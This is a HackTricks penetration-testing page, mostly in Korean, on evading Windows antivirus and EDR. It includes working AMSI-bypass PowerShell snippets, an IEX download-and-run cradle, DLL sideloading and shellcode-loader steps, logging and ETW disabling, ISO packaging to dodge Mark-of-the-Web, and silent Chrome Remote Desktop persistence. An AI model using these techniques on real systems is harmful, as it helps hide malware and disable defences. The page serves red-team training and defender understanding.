# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**This page was written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender의 동작을 멈추게 하는 도구입니다.
- [no-defender](https://github.com/es3n1n/no-defender): 다른 AV를 가장하여 Windows Defender의 동작을 멈추게 하는 도구입니다.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

현재 AV들은 정적 탐지(static detection), 동적 분석(dynamic analysis), 그리고 더 고급 EDR의 경우 행위 분석(behavioural analysis) 등 다양한 방법으로 파일이 악성인지 여부를 판별합니다.

### **Static detection**

정적 탐지는 바이너리나 스크립트 내의 알려진 악성 문자열이나 바이트 배열을 표시하거나 파일 자체에서 정보를 추출(예: file description, company name, digital signatures, icon, checksum 등)하여 이루어집니다. 이는 공개적으로 알려진 툴을 사용하면 쉽게 탐지될 수 있다는 의미로, 해당 툴들이 이미 분석되어 악성으로 표시되었을 가능성이 높습니다. 이런 종류의 탐지를 회피하는 몇 가지 방법은 다음과 같습니다.

- **Encryption**

바이너리를 암호화하면 AV가 프로그램을 탐지할 방법이 없어지지만, 메모리에서 프로그램을 복호화하고 실행할 로더가 필요합니다.

- **Obfuscation**

때로는 바이너리나 스크립트의 일부 문자열만 바꾸는 것만으로도 AV를 통과할 수 있지만, 무엇을 난독화하느냐에 따라 시간이 많이 들 수 있습니다.

- **Custom tooling**

자체 도구를 개발하면 알려진 악성 시그니처가 없겠지만, 이는 많은 시간과 노력이 필요합니다.

> [!TIP]
> Windows Defender의 정적 탐지와 비교해보기 좋은 도구는 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)입니다. 이 도구는 파일을 여러 세그먼트로 나누고 각 세그먼트를 Defender에게 개별적으로 스캔하게 하여, 바이너리에서 어떤 문자열이나 바이트가 표시되는지 정확히 알려줍니다.

실무적인 AV 회피에 관한 이 [YouTube 플레이리스트](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)를 강력히 추천합니다.

### **Dynamic analysis**

동적 분석은 AV가 바이너리를 샌드박스에서 실행하고 악성 활동(예: 브라우저 비밀번호 복호화 및 읽기 시도, LSASS에서 minidump 수행 등)을 감시하는 방식입니다. 이 부분은 다루기 좀 까다로울 수 있지만, 샌드박스를 회피하기 위해 시도해볼 수 있는 몇 가지 방법은 다음과 같습니다.

- **Sleep before execution** 구현 방식에 따라 AV의 동적 분석을 우회하는 좋은 방법이 될 수 있습니다. AV는 사용자의 작업 흐름을 방해하지 않기 위해 파일을 스캔할 시간이 매우 짧으므로, 긴 sleep은 바이너리 분석을 방해할 수 있습니다. 문제는 많은 AV 샌드박스가 구현 방식에 따라 sleep을 건너뛸 수 있다는 점입니다.
- **Checking machine's resources** 보통 샌드박스는 사용할 수 있는 리소스가 매우 적습니다(예: < 2GB RAM). 그렇지 않으면 사용자 기기를 느리게 할 수 있기 때문입니다. CPU 온도나 팬 속도 등을 확인하는 식으로 창의적으로 체크할 수 있습니다. 샌드박스에서는 모든 것이 구현되어 있지 않을 수 있습니다.
- **Machine-specific checks** 만약 목표가 "contoso.local" 도메인에 가입된 사용자의 워크스테이션이라면, 컴퓨터의 도메인을 검사하여 지정한 도메인과 일치하지 않으면 프로그램을 종료하게 할 수 있습니다.

Microsoft Defender의 샌드박스 컴퓨터 이름이 HAL9TH인 것으로 알려져 있으므로, 실행 전 malware에서 컴퓨터 이름을 확인하여 HAL9TH와 일치하면 Defender 샌드박스 내부에 있다는 의미이므로 프로그램을 종료하도록 할 수 있습니다.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

샌드박스 대응에 대한 [@mgeeky](https://twitter.com/mariuszbit)의 다른 아주 좋은 팁들

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

이 글에서 앞서 말했듯이, **public tools**은 결국 **감지됩니다**, 그래서 스스로에게 물어보세요:

예를 들어 LSASS를 덤프하려 할 때, **정말로 mimikatz를 사용해야 하나요**? 아니면 LSASS를 덤프하는 덜 알려진 다른 프로젝트를 사용할 수 있나요?

정답은 후자일 가능성이 큽니다. 예를 들어 mimikatz는 AV와 EDR에 의해 가장 많이(혹은 그 중 하나로) 표시되는 툴일 가능성이 높습니다. 프로젝트 자체는 훌륭하지만, AV를 회피하기 위해 사용하기엔 골치아픈 경우가 많으니, 달성하려는 목적에 맞는 대안을 찾으세요.

> [!TIP]
> 회피를 위해 페이로드를 수정할 때는 Defender의 자동 샘플 제출(automatic sample submission)을 끄는 것을 잊지 마세요. 그리고 진지하게 말하는데, 장기적으로 회피를 달성하려는 목적이라면 **절대 VIRUSTOTAL에 업로드하지 마세요**. 특정 AV에 대해 페이로드가 감지되는지 확인하려면 해당 AV를 VM에 설치하고 자동 샘플 제출을 끈 뒤 VM에서 테스트하세요. 만족할 때까지 그곳에서만 테스트하세요.

## EXEs vs DLLs

가능한 경우 항상 회피를 위해 **DLL 사용을 우선시**하세요. 제 경험상 DLL 파일은 보통 **탐지율이 훨씬 낮고** 분석도 덜 되므로, (페이로드가 DLL로서 실행될 수 있는 방법이 있다면) 감지를 피하기 위한 매우 간단한 트릭입니다.

아래 이미지에서 보듯이, Havoc의 DLL 페이로드는 antiscan.me에서 4/26의 탐지율을 보인 반면 EXE 페이로드는 7/26의 탐지율을 보였습니다.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

이제 DLL 파일을 사용해 훨씬 더 은밀해질 수 있는 몇 가지 트릭을 보여드리겠습니다.

## DLL Sideloading & Proxying

**DLL Sideloading**은 로더가 사용하는 DLL 검색 순서를 이용해, 취약한 애플리케이션과 악성 페이로드 DLL을 함께 배치하는 방식입니다.

[Siofra](https://github.com/Cybereason/siofra)와 다음 powershell 스크립트를 사용하면 DLL Sideloading에 취약한 프로그램을 확인할 수 있습니다:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
이 명령은 "C:\Program Files\\" 내부에서 DLL hijacking에 susceptible한 프로그램 목록과 그들이 로드하려는 DLL 파일들을 출력합니다.

직접 **DLL Hijackable/Sideloadable programs**를 탐색해볼 것을 강력히 권합니다. 이 기법은 제대로 수행하면 꽤 은밀하지만, 공개적으로 알려진 DLL Sideloadable programs를 사용하면 쉽게 발각될 수 있습니다.

프로그램이 로드할 것으로 예상하는 이름의 악성 DLL을 단순히 배치하는 것만으로는 페이로드가 실행되지 않습니다. 프로그램은 해당 DLL 내부에 특정 함수들을 기대하기 때문입니다. 이 문제를 해결하기 위해 **DLL Proxying/Forwarding**이라는 다른 기법을 사용하겠습니다.

**DLL Proxying**은 프록시(악성) DLL에서 원본 DLL로 프로그램이 호출하는 함수들을 포워딩하여 프로그램의 기능을 유지하면서 페이로드 실행을 처리할 수 있게 합니다.

저는 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 프로젝트를 [@flangvik](https://twitter.com/Flangvik/)로부터 사용할 것입니다.

다음은 제가 따른 단계들입니다:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
마지막 명령은 우리에게 2개의 파일을 제공합니다: DLL 소스 코드 템플릿과 원래 이름이 변경된 DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

우리의 shellcode ([SGN](https://github.com/EgeBalci/sgn)로 인코딩된)와 proxy DLL은 [antiscan.me](https://antiscan.me)에서 0/26 Detection rate를 기록했습니다! 저는 이를 성공이라고 부르겠습니다.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading에 관한 [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543)와 [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE)를 시청하는 것을 저는 **강력히 권장합니다**. 우리가 논의한 내용을 더 깊이 이해하는 데 도움이 됩니다.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze를 사용하여 shellcode를 은밀하게 로드하고 실행할 수 있습니다.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion은 단순한 쫓고 쫓기는 게임입니다. 오늘 통하는 방법이 내일 감지될 수 있으니 한 가지 도구에만 의존하지 말고, 가능하면 여러 evasion techniques를 연쇄적으로 사용해 보세요.

## AMSI (Anti-Malware Scan Interface)

AMSI는 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"를 방지하기 위해 만들어졌습니다. 초기에는 AVs가 **files on disk**만 검사할 수 있었기 때문에, 페이로드를 **directly in-memory**로 실행할 수 있다면 AV는 이를 막을 수 없었습니다. 가시성이 충분하지 않았기 때문입니다.

AMSI 기능은 Windows의 다음 구성 요소에 통합되어 있습니다.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

이 기능은 스크립트 내용을 암호화되거나 난독화되지 않은 형태로 노출하여 antivirus 솔루션이 스크립트 동작을 검사할 수 있게 합니다.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:`를 앞에 붙이고 스크립트를 실행한 실행 파일의 경로(이 경우 powershell.exe)를 표시하는 것을 볼 수 있습니다.

우리는 디스크에 어떤 파일도 떨어뜨리지 않았지만, AMSI 때문에 메모리 내에서 잡혔습니다.

또한 **.NET 4.8**부터는 C# 코드도 AMSI를 통해 실행됩니다. 이는 `Assembly.Load(byte[])`를 통한 in-memory 실행에도 영향을 미칩니다. 따라서 AMSI를 회피하려면 in-memory 실행 시 낮은 버전의 .NET(예: 4.7.2 이하)을 사용하는 것이 권장됩니다.

AMSI를 우회하는 방법은 몇 가지가 있습니다:

- **Obfuscation**

AMSI는 주로 정적 탐지를 사용하기 때문에 로드하려는 스크립트를 수정하는 것이 탐지를 피하는 좋은 방법이 될 수 있습니다.

다만 AMSI는 여러 레이어로 난독화된 스크립트도 역난독화할 수 있는 능력이 있어, 난독화는 어떻게 했느냐에 따라 오히려 나쁜 선택이 될 수 있습니다. 따라서 회피가 그렇게 간단하지 않을 수 있습니다. 하지만 때로는 변수 이름 몇 개만 바꾸면 충분할 때도 있으니, 얼마나 심각하게 플래그가 붙었는지에 따라 다릅니다.

- **AMSI Bypass**

AMSI는 DLL을 powershell(또는 cscript.exe, wscript.exe 등) 프로세스에 로드하는 방식으로 구현되어 있기 때문에, 권한이 없는 사용자로 실행 중이라도 쉽게 조작할 수 있습니다. AMSI 구현의 이 결함 때문에 연구자들은 AMSI 스캔을 우회하는 여러 방법을 찾아냈습니다.

**Forcing an Error**

AMSI 초기화가 실패하도록 강제(amsiInitFailed)하면 현재 프로세스에 대해 스캔이 시작되지 않습니다. 원래 이 방법은 [Matt Graeber](https://twitter.com/mattifestation)이 공개했으며, Microsoft는 더 넓은 사용을 막기 위해 시그니처를 개발했습니다.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
단 한 줄의 powershell 코드만으로 현재 powershell 프로세스에서 AMSI를 무력화할 수 있었다. 이 한 줄은 물론 AMSI에 의해 탐지되었기 때문에, 이 기법을 사용하려면 약간의 수정이 필요하다.

다음은 내가 이 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)에서 가져온 수정된 AMSI bypass이다.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

이 기술은 처음에 [@RastaMouse](https://twitter.com/_RastaMouse/)에 의해 발견되었으며, 사용자 제공 입력을 스캔하는 역할을 하는 amsi.dll의 "AmsiScanBuffer" 함수 주소를 찾아 E_INVALIDARG 코드를 반환하도록 덮어쓰는 방식입니다. 이렇게 하면 실제 스캔 결과는 0을 반환하고, 0은 클린 결과로 해석됩니다.

> [!TIP]
> 자세한 설명은 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)를 읽어보세요.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

This tools [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**감지된 시그니처 제거**

현재 프로세스의 메모리에서 감지된 AMSI 시그니처를 제거하려면 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 및 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 같은 도구를 사용할 수 있습니다. 이 도구들은 현재 프로세스의 메모리를 검색하여 AMSI 시그니처를 찾은 뒤 NOP 명령으로 덮어써 메모리에서 사실상 제거합니다.

**AMSI를 사용하는 AV/EDR 제품들**

AMSI를 사용하는 AV/EDR 제품 목록은 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**에서 확인할 수 있습니다.

**Use Powershell version 2**
If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
```bash
powershell.exe -version 2
```
## PS 로깅

PowerShell 로깅은 시스템에서 실행된 모든 PowerShell 명령을 기록할 수 있게 해주는 기능입니다. 이는 감사 및 문제해결에 유용하지만, 탐지를 회피하려는 공격자에게는 **문제가 될 수 있습니다**.

PowerShell 로깅을 우회하려면 다음 기술을 사용할 수 있습니다:

- **Disable PowerShell Transcription and Module Logging**: 다음과 같은 도구를 사용할 수 있습니다: [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs)
- **Use Powershell version 2**: PowerShell version 2를 사용하면 AMSI가 로드되지 않으므로 AMSI에 의해 스캔되지 않고 스크립트를 실행할 수 있습니다. 다음과 같이 실행하세요: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: 방어 기능이 없는 powershell 세션을 생성하려면 [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 을(를) 사용하세요 (이는 `powerpick`이 Cobal Strike에서 사용하는 방법입니다).


## 난독화

> [!TIP]
> 몇몇 난독화 기술은 데이터 암호화에 의존하는데, 이는 바이너리의 엔트로피를 증가시켜 AVs 및 EDRs가 탐지하기 더 쉽게 만듭니다. 이 점을 주의하고, 암호화는 민감하거나 숨겨야 하는 코드의 특정 섹션에만 적용하는 것이 좋습니다.

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2(또는 상용 포크)를 사용하는 악성코드를 분석할 때, 디컴파일러와 샌드박스를 차단하는 여러 보호층을 마주하는 경우가 흔합니다. 아래 워크플로우는 이후 dnSpy나 ILSpy 같은 도구에서 C#으로 디컴파일할 수 있는 거의 원본에 가까운 IL을 안정적으로 **복원합니다**.

1.  Anti-tampering removal – ConfuserEx는 모든 *메서드 본문*을 암호화하고 *모듈*의 static 생성자(`<Module>.cctor`) 내부에서 이를 복호화합니다. 이는 또한 PE 체크섬을 패치하므로 어떤 수정이 있으면 바이너리가 충돌합니다. 암호화된 메타데이터 테이블을 찾아 XOR 키를 복구하고 깨끗한 어셈블리를 다시 쓰려면 **AntiTamperKiller**를 사용하세요:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
출력에는 자체 언패커를 만들 때 유용할 수 있는 6개의 안티탬퍼 매개변수(`key0-key3`, `nameHash`, `internKey`)가 포함됩니다.

2.  Symbol / control-flow recovery – *clean* 파일을 ConfuserEx 인식 포크인 **de4dot-cex**에 입력하세요.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
플래그:
• `-p crx` – ConfuserEx 2 프로필 선택  
• de4dot는 제어 흐름 평탄화(control-flow flattening)를 되돌리고, 원래의 네임스페이스, 클래스 및 변수 이름을 복원하며 상수 문자열을 복호화합니다.

3.  Proxy-call stripping – ConfuserEx는 디컴파일을 더욱 방해하기 위해 직접 메서드 호출을 경량 래퍼(일명 *proxy calls*)로 대체합니다. **ProxyCall-Remover**로 이를 제거하세요:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
이 단계 후에는 불투명한 래퍼 함수(`Class8.smethod_10`, …) 대신 `Convert.FromBase64String` 또는 `AES.Create()` 같은 일반적인 .NET API가 보여야 합니다.

4.  Manual clean-up – 결과 바이너리를 dnSpy에서 열고 큰 Base64 블롭이나 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 사용을 검색하여 *실제* 페이로드를 찾습니다. 종종 악성코드는 이를 `<Module>.byte_0` 내부에서 초기화된 TLV 인코딩 바이트 배열로 저장합니다.

위 절차는 악성 샘플을 **실행할 필요 없이** 실행 흐름을 복원하므로, 오프라인 워크스테이션에서 작업할 때 유용합니다.

> 🛈  ConfuserEx는 `ConfusedByAttribute`라는 커스텀 속성을 생성합니다. 이는 샘플을 자동 분류할 때 IOC로 사용할 수 있습니다.

#### 원라이너
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 이 프로젝트의 목적은 [LLVM](http://www.llvm.org/) 컴파일링 스위트의 오픈 소스 포크를 제공하여 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 및 tamper-proofing을 통해 소프트웨어 보안을 향상시키는 것입니다.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator는 `C++11/14` 언어를 사용하여 컴파일 시점에 외부 도구나 컴파일러 수정 없이 obfuscated code를 생성하는 방법을 보여줍니다.
- [**obfy**](https://github.com/fritzone/obfy): C++ 템플릿 메타프로그래밍 프레임워크로 생성된 obfuscated operations 레이어를 추가하여 애플리케이션을 크랙하려는 사람의 작업을 조금 더 어렵게 만듭니다.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz는 x64 바이너리 obfuscator로, .exe, .dll, .sys 등을 포함한 다양한 pe 파일을 obfuscate할 수 있습니다.
- [**metame**](https://github.com/a0rtega/metame): Metame는 임의의 executables를 위한 간단한 metamorphic code engine입니다.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator는 ROP (return-oriented programming)을 사용하여 LLVM 지원 언어에 대해 세분화된 code obfuscation 프레임워크입니다. ROPfuscator는 일반 명령어를 ROP chains로 변환하여 어셈블리 코드 수준에서 프로그램을 obfuscate함으로써 정상적인 제어 흐름에 대한 자연스러운 개념을 방해합니다.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt는 Nim으로 작성된 .NET PE Crypter입니다.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor는 기존 EXE/DLL을 shellcode로 변환한 다음 로드할 수 있습니다

## SmartScreen & MoTW

인터넷에서 일부 executables를 다운로드하여 실행할 때 이 화면을 본 적이 있을 것입니다.

Microsoft Defender SmartScreen은 잠재적으로 악성일 수 있는 애플리케이션의 실행으로부터 최종 사용자를 보호하기 위한 보안 메커니즘입니다.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen은 주로 평판 기반 접근 방식으로 동작합니다. 즉, 흔히 다운로드되지 않는 애플리케이션은 SmartScreen을 유발하여 사용자에게 경고하고 파일 실행을 차단합니다(단, 파일은 More Info -> Run anyway를 클릭하면 여전히 실행할 수 있습니다).

**MoTW** (Mark of The Web)은 Zone.Identifier라는 이름의 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)으로, 인터넷에서 파일을 다운로드할 때 해당 파일에 대해 자동으로 생성되며 다운로드된 URL 정보를 포함합니다.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>인터넷에서 다운로드한 파일의 Zone.Identifier ADS 확인.</p></figcaption></figure>

> [!TIP]
> 신뢰된 서명 인증서로 서명된 executables은 SmartScreen을 유발하지 않는다는 점을 기억하는 것이 중요합니다.

payloads가 Mark of The Web을 받지 않도록 하는 매우 효과적인 방법 중 하나는 ISO와 같은 컨테이너 안에 패키징하는 것입니다. 이는 Mark-of-the-Web (MOTW)이 non NTFS 볼륨에는 적용될 수 없기 때문입니다.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)는 payloads를 출력 컨테이너에 패키징하여 Mark-of-the-Web을 회피하는 도구입니다.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW)는 Windows에서 애플리케이션과 시스템 구성요소가 **이벤트를 기록**할 수 있게 해주는 강력한 로깅 메커니즘입니다. 하지만 보안 제품이 악성 활동을 모니터링하고 탐지하는 데에도 사용될 수 있습니다.

AMSI가 비활성화(우회)되는 방식과 유사하게, 사용자 공간 프로세스의 **`EtwEventWrite`** 함수를 이벤트를 기록하지 않고 즉시 반환하도록 만들 수도 있습니다. 이는 메모리에서 해당 함수를 패치하여 즉시 반환하게 함으로써 해당 프로세스의 ETW 로깅을 사실상 비활성화하는 방식입니다.

자세한 내용은 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**에서 확인할 수 있습니다.


## C# Assembly Reflection

C# 바이너리를 메모리에 로드하는 방법은 오래전부터 알려져 왔으며, AV에 걸리지 않고 post-exploitation 도구를 실행하는 매우 좋은 방법입니다.

페이로드가 디스크를 건드리지 않고 메모리에 직접 로드되기 때문에 프로세스 전체에 대한 AMSI 패치만 신경 쓰면 됩니다.

대부분의 C2 프레임워크(sliver, Covenant, metasploit, CobaltStrike, Havoc 등)는 이미 C# 어셈블리를 메모리에서 직접 실행하는 기능을 제공하지만, 이를 수행하는 방법에는 여러 가지가 있습니다:

- **Fork\&Run**

이는 **새로운 희생 프로세스(sacrificial process)를 생성(spawn)**하고, 그 새 프로세스에 post-exploitation 악성 코드를 인젝션하여 실행한 뒤 완료되면 해당 프로세스를 종료하는 방식입니다. 장단점이 모두 있습니다. fork and run 방식의 장점은 실행이 우리 Beacon implant 프로세스의 **외부(outside)**에서 발생한다는 점입니다. 이는 post-exploitation 작업이 잘못되거나 탐지되더라도 우리의 **implant가 살아남을** 가능성이 훨씬 크다는 것을 의미합니다. 단점은 **Behavioural Detections**에 걸릴 가능성이 더 크다는 점입니다.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

이는 post-exploitation 악성 코드를 **자신의 프로세스에(in its own process)** 인젝션하는 방식입니다. 이렇게 하면 새 프로세스를 생성해 AV 스캔 대상이 되지 않도록 피할 수 있지만, 페이로드 실행 중 문제가 발생하면 프로세스가 크래시되어 **beacon을 잃을** 가능성이 훨씬 커지는 단점이 있습니다.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly 로딩에 대해 더 읽고 싶다면 이 기사 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/)와 그들의 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))를 참고하세요.

PowerShell에서도 C# Assemblies를 로드할 수 있습니다. [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)와 [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk)를 확인해 보세요.

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), 취약해진 머신이 Attacker Controlled SMB share에 설치된 인터프리터 환경에 접근할 수 있도록 하면 다른 언어를 사용하여 악성 코드를 실행할 수 있습니다.

SMB 공유의 Interpreter Binaries와 환경에 대한 접근을 허용하면 취약해진 머신의 메모리 내에서 이러한 언어들로 임의 코드를 **실행할 수 있습니다**.

레포에는 다음과 같이 명시되어 있습니다: Defender는 여전히 스크립트를 스캔하지만 Go, Java, PHP 등을 활용하면 **정적 시그니처를 우회할 수 있는 유연성**이 더 생깁니다. 이러한 언어들로 작성된 난독화되지 않은 reverse shell 스크립트들로 테스트한 결과 성공을 거둔 사례가 있습니다.

## TokenStomping

Token stomping은 공격자가 액세스 토큰이나 EDR 또는 AV 같은 보안 제품의 토큰을 **조작(manipulate)**하여 권한을 낮춤으로써 프로세스가 종료되지 않으면서도 악성 활동을 확인할 권한을 갖지 못하게 하는 기술입니다.

이를 방지하기 위해 Windows는 보안 프로세스의 토큰에 대해 외부 프로세스가 핸들을 얻는 것을 **차단(prevent external processes)**할 수 있습니다.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), 피해자 PC에 Chrome Remote Desktop을 배포한 뒤 이를 이용해 장악하고 지속성을 유지하는 것은 쉽습니다:
1. https://remotedesktop.google.com/ 에서 다운로드하고 "Set up via SSH"를 클릭한 다음 Windows용 MSI 파일을 클릭하여 MSI 파일을 다운로드합니다.
2. 피해자 시스템에서 설치 관리자로 무음 설치 실행(관리자 권한 필요): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop 페이지로 돌아가서 Next를 클릭합니다. 마법사가 권한을 요청하면 Authorize 버튼을 클릭해 계속합니다.
